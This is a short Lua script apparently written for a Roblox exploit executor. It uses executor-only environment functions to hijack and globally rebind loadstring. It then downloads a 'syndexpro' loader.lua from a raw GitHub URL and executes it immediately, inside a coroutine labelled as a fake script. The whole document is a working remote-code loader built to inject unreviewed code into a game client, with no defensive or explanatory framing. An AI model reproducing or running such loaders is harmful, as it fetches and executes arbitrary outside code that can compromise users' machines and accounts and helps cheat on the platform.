task.spawn(function()
task.synchronize()
local function NSIK_fake_script()
local script = Instance.new('LocalScript')

local ls = getfenv(0)['loadstring'] 
local old_ls = getrenv().loadstring

_G.loadstr = ls 

local shared_env = getrenv().shared

shared_env.loadstr = _G.loadstr

for i = 1, 5 do
getrenv().loadstring = shared_env.loadstr
end

getgenv().loadstring = getrenv().loadstring

loadstring = getrenv().loadstring

local new_ls = getrenv().loadstring

local function newls(...) return new_ls(...) end 

newls(game:HttpGet('https://raw.githubusercontent.com/L8X/syndexpro/main/loader.lua', false, Enum.HttpRequestType.Analytics, true))()
end
coroutine.wrap(NSIK_fake_script)()
end)
